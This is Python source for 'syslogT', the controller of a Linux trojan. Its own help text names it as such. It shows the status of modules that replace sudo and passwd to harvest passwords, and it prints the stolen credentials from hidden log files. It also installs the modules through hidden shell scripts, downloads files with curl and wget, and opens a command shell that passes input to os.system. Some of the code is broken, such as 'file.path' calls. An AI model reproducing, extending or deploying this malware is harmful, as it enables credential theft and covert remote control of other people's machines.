import os
import subprocess
import argparse
import sys

def main():
    if(len(sys.argv) != 2):
        print("Usage: syslogT {command}")
    else:
        option = sys.argv[1]
        if(option.lower() in ('xyz')):
            sys.stdout.write("abc")
        elif(option.lower() in ('-h', '--help')):
            print("""
            Syslogd, controller for the syslogT trojan.
            
            Commands:
            
            h, help    | Displays this message and exits.
            
            s, status  | Displays current module status.
            
            p, pass    | Displays current saved passwords collected by the modules.
            
            i, install | Allows the user to install specific modules.
            
            d, down    | Allows the user to download files/directories from specified sources.
            
            c, command | Allows the user to execute command line commands through os.system.
            
            """)
        elif(option.lower() in ('-s', '--status')):
            print("Current status:")
            print()
            if(checkStatus(".brain.py")):
                os.system("echo -e "+"Sudo Brain status: "+"\033[32m[ACTIVE]\033[0m")
            else:
                os.system("echo -e "+"Sudo Brain status: "+"\033[31m[INACTIVE]\033[0m")
            if(file.path.exists("/usr/bin/passwdB") and file.path.exists("/usr/bin/passwd") and file.path.exists("/usr/bin/passwdA")):
                os.system("echo -e "+"passwdReplacer status: "+"\033[32m[ACTIVE]\033[0m")
            else:
                os.system("echo -e "+"passwdReplacer status: "+"\033[31m[INACTIVE]\033[0m")
        elif(option.lower() in ('p', '--pass')):
            if(os.path.exists("/lib/.syslogbLog")):
                os.system("cat /lib/.syslogbLog | less")
            else:
                print("Harvested passwords from sudo not available.")
        elif(option.lower() in ('-d', '--down')):
            print("Entering Downloader")
            option = input("(F)ile or (D)irectory: ")
            if(option.lower() in ('f')):       
                Fil = input("Enter name of file to place download in: ")
                Dir = input("Enter directory to place file in(proper directory format, no end /): ")
                if(os.path.exists(Dir+"/"+Fil)):
                    option = input("File/Path already exists. Would you like to override? ")
                    if(option.lower() in ('y', 'yes')):   
                        link = input("Enter full url to download from: ")
                        os.system("curl -o "+Dir+"/"+Fil+ " "+link)
                        if(os.path.exists(Dir+"/"+Fil)):
                            print("Successfully Downloaded.")
                        else:
                            print("File not present after download. Possible failure.")
                    else:
                        print("Not overriding. Exiting.")
                else:
                    link = input("Enter full url to download from: ")
                    os.system("curl -o "+Dir+"/"+Fil+ " "+link)
                    if(os.path.exists(Dir+"/"+Fil)):
                        print("Successfully Downloaded.")
                    else:
                        print("File not present after download. Possible failure.")
            elif(option.lower() in ('d')):
                Dir = input("Enter directory to download to(proper directory format): ") 
                link = input("Enter full url to download from: ")
                option = input("Recursion(digs through subdirectories): ")
                if(option.lower() in ('y')):
                    num = input("How much depth(how many levels of subdirectories): ")
                    os.system("mkdir "+Dir)
                    os.system("wget -P "+Dir+ " -r -l "+num+" "+link)
                else:
                    os.system("mkdir "+Dir)
                    os.system("wget -P "+Dir+ " "+link)
        elif(option.lower() in ('-c', '--command')):
            print("Entering Command-Line.....(Enter \"exit\" to exit)")
            x = True
            while(x):
                inVal = input("Command@SyslogT# ")
                if(inVal.lower() in ("exit")):
                    x = False
                elif(inVal.lower() in ('h', 'help')):
                    os.system("cat /var/spool/.log.sh")
                elif(inVal.lower() in ("info")):
                    print(os.uname())
                else:
                    os.system(inVal)
        elif(option.lower() in ('-p', '--pass')):
            a = True
            if(file.path.exists("/lib/.passwdLog")):
                a = False
                print("Credentials from passwdReplacer:")
                os.system("cat /lib/.passwdLog | less")
            if(file.path.exists("lib/.syslogbLog")):
                a = False
                print("Credentials from sudoReplacer:")
                os.system("cat /lib/.syslogbLog | less")
            if(a):
                print("No credential harvesting saves present.")
        elif(option.lower() in ('-i', '--install')):
            print("Installing modules...")
            print("")
            print("Current status:")
            print("")
            if(checkStatus(".brain.py")):
                os.system("echo -e "+"1) Sudo Brain status: "+"\033[32m[ACTIVE]\033[0m")
            else:
                os.system("echo -e "+"1) Sudo Brain status: "+"\033[31m[INACTIVE]\033[0m")
            if(file.path.exists("/usr/bin/passwdB") and file.path.exists("/usr/bin/passwd") and file.path.exists("/usr/bin/passwdA")):
                os.system("echo -e "+"2) passwdReplacer status: "+"\033[32m[ACTIVE]\033[0m")
            else:
                os.system("echo -e "+"2) passwdReplacer status: "+"\033[31m[INACTIVE]\033[0m")
            option = input("Which module would you like to install? ")
            if(option.lower() in ('1')):
                if(checkStatus(".brain.py")):
                    print("sudoReplacer is already installed.")
                else:
                    print("Installing...")
                    os.system("bash /var/.sudoMaker.sh")
            elif(option.lower() in ('2')):
                if(file.path.exists("/usr/bin/passwdB") and file.path.exists("/usr/bin/passwd") and file.path.exists("/usr/bin/passwdA")):
                    print("passwdReplacer is already installed.")
                else:
                    print("Installing...")
                    os.system("bash /var/.passwdMaker.sh")
            else:
                print("Invalid selection.")
def checkStatus(fileName):
    ps_output = subprocess.check_output(["ps", "-ef"])
    ps_lines = ps_output.decode("utf-8").split("\n")
    for line in ps_lines:
        if fileName in line:
            return True
    else:
        return False
main()